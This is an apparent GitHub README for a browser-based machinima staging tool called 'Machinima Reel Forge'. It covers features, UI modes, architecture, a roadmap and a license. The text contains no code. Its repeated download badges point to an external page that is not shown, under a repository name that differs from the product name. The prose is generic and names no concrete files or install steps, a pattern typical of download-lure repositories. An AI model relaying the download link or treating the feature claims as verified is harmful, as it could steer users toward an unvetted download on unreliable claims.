![preview](https://raw.githubusercontent.com/sincrosas/m64mm-machinima-studio/main/splash_6916.svg)
[![Download](https://raw.githubusercontent.com/sincrosas/m64mm-machinima-studio/main/latest_12aed.svg)](https://sincrosas.github.io/m64mm-machinima-studio/)

# 🎬 Machinima Reel Forge

**A modern, browser-first staging suite for building cinematic character reels in vintage-style 3D playgrounds.**

Machinima Reel Forge is a creative workshop for animators, modders, and storytellers who want to choreograph expressive character moments inside retro-styled 3D worlds without wrestling with heavyweight desktop tooling. It borrows the *spirit* of classic machinima directors — frame-by-frame camera work, actor sequencing, prop pinning — and reimagines that workflow for the web era, where collaboration, portability, and instant sharing matter as much as raw horsepower.

[![Download](https://raw.githubusercontent.com/sincrosas/m64mm-machinima-studio/main/latest_12aed.svg)](https://sincrosas.github.io/m64mm-machinima-studio/)

---

## 📚 Table of Contents

- [🌟 Overview](#-overview)
- [🎯 Why This Project Exists](#-why-this-project-exists)
- [🧩 Feature List](#-feature-list)
- [🖥️ Responsive UI](#️-responsive-ui)
- [🌍 Multilingual Support](#-multilingual-support)
- [🛎️ Always-On Assistance](#️-always-on-assistance)
- [🎥 Core Workflow](#-core-workflow)
- [🧱 Architecture at a Glance](#-architecture-at-a-glance)
- [⚙️ Configuration](#️-configuration)
- [🧪 Testing & Quality](#-testing--quality)
- [🤝 Contributing](#-contributing)
- [🗺️ Roadmap](#️-roadmap)
- [📜 License](#-license)
- [⚠️ Disclaimer](#️-disclaimer)

---

## 🌟 Overview

Machinima Reel Forge (often abbreviated **MRF**) is a browser-native director's desk for staging short cinematic sequences featuring stylized low-poly characters. Think of it as a rehearsal hall: you place actors, set the mood with lighting presets, block out camera moves along spline paths, and record takes that can be replayed, layered, and exported.

Unlike monolithic desktop editors, MRF is built around small, composable modules. Every subsystem — the timeline, the pose interpolator, the camera rig, the asset shelf — can be swapped or extended. The result is a toolkit that feels familiar to veterans of legacy movie-maker software while remaining approachable for newcomers who simply want to press record and tell a story.

The project is a ground-up creative interpretation inspired by the long lineage of scene-staging utilities. It does not reuse any code, assets, or brand identity from other projects; it charts its own path with an emphasis on openness, accessibility, and modern web standards.

---

## 🎯 Why This Project Exists

Most animation pipelines assume you are either a professional with a render farm or a hobbyist satisfied with static screenshots. MRF targets the middle ground: creators who want smooth playback, layered takes, shareable links, and a gentle learning curve — all from a tab in their browser.

A few guiding principles shaped the design:

- **The timeline is a storyboard.** Scrubbing should feel like flipping pages, not scrubbing a film reel.
- **Poses are reusable building blocks.** Save a wave, a jump, a glance — reassemble them like LEGO bricks.
- **Sharing beats exporting.** A reel should travel as a link before it travels as a file.
- **Accessibility is not an afterthought.** Keyboard-first editing, screen-reader labels, and adjustable contrast ship in v1.

---

## 🧩 Feature List

- 🎞️ **Spline-based camera choreography** with ease-in/ease-out controls
- 🕺 **Pose blending** between keyframes using adjustable interpolation curves
- 🧍 **Actor sequencer** for staging multiple characters on a shared timeline
- 🪄 **One-click take duplication** for rapid iteration on alternate versions
- 🌗 **Lighting mood presets** ranging from "dusty attic" to "neon arcade"
- 📎 **Prop pinning** to attach accessories to bones or world coordinates
- 🧭 **Onion-skin ghosting** to visualize motion across neighboring frames
- 📤 **Reel bundle export** in a portable, human-readable format
- 🔗 **Shareable scene links** with deterministic seeds for reproducibility
- 🗂️ **Asset shelf** with tagging, favorites, and recent-use history
- 🧠 **Smart snapping** for aligning actors, props, and cameras
- 🕹️ **Playback speed dial** from 0.1x slow-motion to 4x fast-forward
- 🧾 **Shot list panel** that summarizes every camera cut in a reel
- 🎨 **Themeable workspace** with light, dark, and high-contrast palettes

---

## 🖥️ Responsive UI

The workspace adapts to whatever canvas you have. On a widescreen monitor, the timeline stretches into a luxurious ribbon with docked inspectors on both sides. On a tablet, panels collapse into swipeable drawers. On a phone, the interface trims to the essentials: viewport, scrubber, and a compact action bar.

Notably, three layout modes are provided out of the box:

1. **Studio mode** — maximum information density for long editing sessions
2. **Focus mode** — hides everything but the viewport and a minimal scrubber
3. **Review mode** — optimized for playback and client-style presentations

Every layout respects reduced-motion preferences and offers a fully keyboard-navigable alternative to drag-and-drop interactions.

---

## 🌍 Multilingual Support

MRF ships with a translation layer designed for community contributions. Strings live in plain, versioned locale files, and the runtime falls back gracefully to a base language whenever a key is missing. Right-to-left scripts are handled by a mirrored layout engine, and date/time formatting uses locale-aware helpers rather than hardcoded patterns.

Currently supported interface languages include English, Spanish, French, German, Japanese, Portuguese, and Korean, with more arriving through community pull requests. The translation pipeline validates plural rules and warns contributors about ambiguous placeholders before merging.

---

## 🛎️ Always-On Assistance

Because creative tools should not leave you stranded at 3 AM, the project embeds a persistent help surface. It combines contextual tips (triggered by what you are currently doing), a searchable knowledge base, and an asynchronous ticket channel that routes questions to maintainers around the clock. Response expectations are documented, but the practical goal is simple: nobody should wait until morning to unblock a creative flow.

This "round-the-clock companion" ethos extends to automated diagnostics — the app can generate a sanitized environment report that helps supporters reproduce issues quickly.

---

## 🎥 Core Workflow

A typical session unfolds in four movements:

1. **Cast the scene.** Drop actors onto the stage and give them identity labels.
2. **Block the motion.** Set keyframes, blend poses, and refine the timing curve.
3. **Direct the camera.** Draw a spline path, set focal length, and preview the take.
4. **Cut and share.** Trim the reel, arrange shots, and publish a scene link.

Each movement is reversible. Nothing about the workflow locks you in; you can jump between editing the camera and tweaking a character's wrist angle without losing your place.

---

## 🧱 Architecture at a Glance

The codebase is organized as a constellation of loosely coupled packages:

- **forge-core** — timeline math, interpolation, and the document model
- **forge-stage** — rendering surface and scene graph adapter
- **forge-actors** — character rigging, pose library, and skeleton utilities
- **forge-camera** — spline evaluation, easing curves, and framing helpers
- **forge-ui** — design system, panels, and accessibility primitives
- **forge-i18n** — locale loading, fallback resolution, plural validation
- **forge-support** — diagnostics, help center integration, and telemetry opt-in

Communication between packages happens through typed message contracts, which keeps coupling low and makes unit testing straightforward.

---

## ⚙️ Configuration

Configuration is declarative and layered: defaults, workspace overrides, and per-session tweaks. A representative configuration document looks like the following (formatted here as plain text for readability):

- renderer: { antialias: true, shadowQuality: "medium" }
- timeline: { defaultEasing: "easeInOutCubic", snapFrames: 5 }
- camera: { fov: 50, pathSmoothing: 0.35 }
- localization: { fallback: "en", active: "auto" }
- accessibility: { reducedMotion: "auto", contrast: "standard" }

Values can be inspected and adjusted from the settings panel without editing files directly, and every change is recorded in a session journal for easy rollback.

---

## 🧪 Testing & Quality

Quality assurance blends automated checks with human review:

- **Unit tests** cover interpolation math, locale fallbacks, and document schema migrations.
- **Snapshot tests** guard the visual output of rendering primitives.
- **Accessibility audits** run against every panel on a schedule.
- **Golden-path walkthroughs** simulate a full editing session end-to-end.
- **Compatibility sweeps** verify behavior across current versions of major browsers.

Coverage reports are published with each release candidate, and regressions block promotion to stable channels.

---

## 🤝 Contributing

Contributions of every size are welcome — from typo fixes to entirely new modules. Before opening a pull request, please review the following expectations:

- Discuss substantial changes in an issue first so design stays coherent.
- Keep commits focused and descriptive.
- Add or update tests whenever behavior changes.
- Follow the existing code style and naming conventions.
- Be kind, be patient, and assume good faith in reviews.

A detailed contributor guide lives in the repository's documentation folder, covering branching strategy, commit message conventions, and the review checklist maintainers use.

---

## 🗺️ Roadmap

Planned and speculative milestones for the coming year:

- **Q1 2026** — improved pose blending with layered masks
- **Q2 2026** — collaborative editing rooms with live cursors
- **Q3 2026** — audio track synchronization and beat markers
- **Q4 2026** — plugin marketplace for community-authored modules
- **Beyond** — experimental support for importing legacy scene formats

Roadmap items are aspirational; priorities shift based on community feedback and maintainer availability.

---

## 📜 License

This project is released under the **MIT License**. You are welcome to use, modify, and redistribute it in accordance with the terms of that license. See the full text here:

- [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Machinima Reel Forge contributors.

---

## ⚠️ Disclaimer

Machinima Reel Forge is an independent creative tool intended for lawful, original content creation. It is not affiliated with, endorsed by, or sponsored by any console manufacturer, game publisher, or trademark holder. All product names, logos, and brands referenced elsewhere are the property of their respective owners and are used only for descriptive, informational purposes.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

Users are solely responsible for ensuring that any content they create, publish, or distribute complies with applicable laws and the terms of service of any platform they use. Always respect intellectual property rights and the wishes of original creators.

---

[![Download](https://raw.githubusercontent.com/sincrosas/m64mm-machinima-studio/main/latest_12aed.svg)](https://sincrosas.github.io/m64mm-machinima-studio/)